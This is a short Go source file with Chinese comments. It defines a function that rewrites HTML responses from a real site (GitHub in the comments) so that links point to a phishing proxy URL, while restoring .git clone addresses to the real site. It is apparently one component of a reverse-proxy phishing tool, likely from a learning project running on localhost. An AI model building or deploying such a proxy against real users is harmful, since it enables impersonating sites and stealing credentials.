package request

import (
	"fmt"
	"net/http"
	"regexp"
	"strings"
)

// 將真正網站拿到的 response 在替換成 phishing 的資訊，給瀏覽器
func ReplaceURL(body []byte, header http.Header, upstreamURL, phishURL string) []byte {
	// 判斷 Content-Type 是不是 text/html
	contentType := header.Get("Content-Type")
	isHTML := strings.Contains(contentType, "text/html")

	// 如果不是 HTML 就不取代
	if !isHTML {
		return body
	}

	// 把 https://github.com 取代為 http://localhost:8080
	// strings.Replace 最後一個參數是指最多取代幾個，-1 就是全部都取代
	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)

	phishGitURL := fmt.Sprintf(`%s(.*)\.git`, phishURL)
	upstreamGitURL := fmt.Sprintf(`%s$1.git`, upstreamURL)

	// 尋找符合 git 網址的特徵
	re, err := regexp.Compile(phishGitURL)
	if err != nil {
		panic(err)
	}

	// 取代成 github 網址
	bodyStr = re.ReplaceAllString(bodyStr, upstreamGitURL)

	return []byte(bodyStr)
}
